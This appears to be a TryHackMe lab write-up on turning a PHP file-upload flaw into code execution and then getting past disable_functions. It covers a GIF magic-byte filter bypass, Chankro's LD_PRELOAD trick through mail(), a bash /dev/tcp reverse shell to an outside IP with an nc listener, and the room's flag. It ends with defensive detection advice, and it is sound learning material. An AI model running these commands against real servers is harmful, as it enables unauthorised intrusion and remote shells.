# [Bypass Disable Functions](https://tryhackme.com/room/bypassdisablefunctions) - TryHackMe

 Platform: ![TryHackMe](https://img.shields.io/badge/TryHackMe-1abc9c?style=flat-square) | Perspective: Attacker

**Category:** Web Exploitation / Defense Evasion

**Objective:** Exploit a file upload vulnerability to get code execution, then bypass `disable_functions` restrictions in PHP to get a reverse shell and find `flag.txt`

## What I was working with

The target was a job portal site with a "CV upload" feature at `cv.php` that only accepted image files. The real goal of the room wasn't the upload itself, it was what happens after. PHP had `system()`, `shell_exec()`, `exec()`, and a handful of other command-execution functions explicitly disabled in `php.ini`. So even with code execution, I couldn't just run commands directly. I needed a way around that restriction.

<img width="1917" height="936" alt="Screenshot 2026-10-20 142252" src="https://github.com/user-attachments/assets/70f2b291-cd49-4e51-885e-b2f231d591d1" />

<img width="1291" height="871" alt="Screenshot 2026-10-20 142408" src="https://github.com/user-attachments/assets/fc21bf4d-5cf4-489c-9bed-b386067a300b" />


## Step 1: Getting past the upload filter

Uploading a plain `.php` file got rejected with "Upload a real image." That told me the server wasn't just checking the file extension, it was checking the file content, most likely with something like `getimagesize()`, which only looks at the first few bytes of a file to decide if it's a valid image.

I confirmed this by prepending a GIF magic byte header to my PHP payload:

```bash
printf 'GIF89a;' | cat - payload.php > payload_gif.php
```

That was enough. The server saw valid GIF bytes at the start of the file and accepted it, while the file was still saved with a `.php` extension, so when I requested it directly, Apache executed it as PHP regardless of what was written before the `<?php` tag.

## Step 2: Confirming disable_functions

Uploading a minimal `phpinfo()` payload and viewing it directly confirmed two things:

- `disable_functions` included `exec`, `shell_exec`, `system`, `passthru`, `proc_open`, `popen`, and several others
- `mail` was **not** disabled, and `sendmail_path` was properly configured to `/usr/sbin/sendmail -t -i`

That second point mattered a lot. The whole bypass technique I was about to use depends entirely on `mail()` being callable and an actual `sendmail` binary being configured. If either of those weren't true, nothing past this point would have worked, and I wouldn't have gotten an error telling me why.

## Step 3: Bypassing disable_functions with Chankro

I used Chankro, a tool that abuses a technique first reported in 2008: PHP's `mail()` function calls the system's `sendmail` binary, and if `putenv()` is allowed (it usually isn't blocked, since nobody thinks to disable it), you can set `LD_PRELOAD` before that call. That lets you preload a malicious shared library that hijacks `sendmail`'s own execution and runs arbitrary code instead, completely sidestepping the disabled PHP functions.

Chankro automates generating the dropper PHP file:

```bash
python2 chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html/uploads
```

A few things tripped me up here that are worth noting, since this is where most of my time actually went:

**Python 2 vs 3.** Chankro is written in old Python 2 syntax. Running it with plain `python` on my machine defaulted to Python 3 and threw a `SyntaxError` on the very first `print` statement. Had to explicitly call `python2 chankro.py`.

**Wrong path.** My first few attempts pointed Chankro at `/var/www/html`, and my test payload (`whoami > /var/www/html/a.txt`) never showed up. I assumed the write silently failed. It turned out the real document root wasn't `/var/www/html` at all, it was a randomized subdirectory underneath it (`/var/www/html/fa5fba5f5a39.../`). I only found this by uploading a `phpinfo()` payload and checking `DOCUMENT_ROOT` directly. Once I pointed both the dropper path and my test script at the correct root, the `whoami` output appeared immediately and confirmed the technique was actually working.

**Typo in the reverse shell path.** My first reverse shell attempt silently failed to connect. The payload was:

```bash
bash -i >& /dev/tcp/192.168.146.88 /4444 0>&1
```

There's a stray space between the IP and the port. Bash parses `/dev/tcp/IP/PORT` as a single path, so that space broke it into two separate arguments and the redirect just failed quietly, no error shown since PHP error display was off. 

Fixing it to one unbroken path solved it:

```bash
bash -i >& /dev/tcp/192.168.146.88/4444 0>&1
```

## Step 4: Getting the shell

With the path and payload both correct, the full sequence was:

```bash
# generate the dropper
python2 chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html/<realdocroot>/uploads

# bypass the image content check
printf 'GIF89a;' | cat - tryhackme.php > payload.php
```

Started a listener:

```bash
nc -lvnp 4444
```

Uploaded `payload.php` through the CV form, then triggered it by visiting it directly in the browser. The listener caught a shell as `www-data`.

## Step 5: Finding the flag

```bash
find / -name flag.txt 2>/dev/null
```

Found it at `/home/s4vi/flag.txt`:

```
thm{bypass_d1sable_functions_1n_php}
```

<img width="882" height="533" alt="Screenshot 2026-10-20 150937" src="https://github.com/user-attachments/assets/cae4d1a8-5378-4d4b-805f-a215ef685969" />

## Detection takeaways

Framing this from the defensive side, since that's the perspective I actually want to build toward:

- **`LD_PRELOAD` being set from a web server process is a strong signal.** Legitimate PHP applications never need to set that environment variable. EDR or host-based monitoring that flags `putenv()` calls setting `LD_PRELOAD` from Apache/PHP-FPM worker processes would catch this technique at the exact moment it fires.
- **File upload validation that only checks magic bytes is not enough.** A check like `getimagesize()` confirms a file *starts* with valid image data, it says nothing about what else is in the file or what extension it's saved under. Real validation needs to check the saved extension against an allowlist, strip or re-encode uploaded images server-side, and store uploads outside the web root or in a location where the server is configured not to execute scripts.
- **`disable_functions` alone is not a security boundary.** It blocks the obvious functions but leaves plenty of less obvious paths to code execution, `mail()`, `dl()`, and others. Function-level denylisting is easy to think is "enough" and easy to bypass once someone knows to look for what wasn't included.
